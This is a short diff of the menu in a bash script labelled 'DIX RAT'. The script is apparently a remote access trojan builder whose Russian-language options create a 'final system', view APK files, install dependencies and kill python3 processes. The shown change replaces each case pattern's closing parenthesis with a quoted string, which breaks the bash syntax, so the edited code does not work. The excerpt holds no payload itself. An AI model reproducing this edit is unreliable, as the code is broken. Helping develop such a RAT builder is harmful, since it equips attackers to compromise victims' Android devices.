@@ -935,11 +935,11 @@ show_menu() {
         read -p "[DIX RAT] Выбери цифру: " choice
         
         case $choice in
-            1) create_final_system ;;
-            2) view_apk_files ;;
-            3) install_dependencies ;;
-            4) pkill -f python3 && echo "[DIX RAT] ✅ Процессы остановлены" && sleep 2 ;;
-            0) 
+            "1" create_final_system ;;
+            "2" view_apk_files ;;
+            "3" install_dependencies ;;
+            "4" pkill -f python3 && echo "[DIX RAT] ✅ Процессы остановлены" && sleep 2 ;;
+            "0" 
                 echo "[DIX RAT] 👋 Выход"
                 exit 0 
                 ;;
